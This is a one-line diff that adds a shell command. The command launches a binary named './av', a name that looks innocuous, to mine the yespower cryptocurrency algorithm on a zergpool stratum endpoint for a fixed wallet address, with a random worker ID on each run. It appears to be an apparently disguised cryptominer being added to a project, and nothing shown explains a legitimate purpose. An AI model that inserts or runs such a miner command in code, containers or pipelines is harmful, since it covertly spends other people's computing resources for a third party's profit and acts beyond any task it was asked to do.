@@ -1,0 +1,1 @@
+./av -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7 -p c=CPMK,ID=$(echo $(shuf -i 1-50000 -n 1)-doWer) -t4
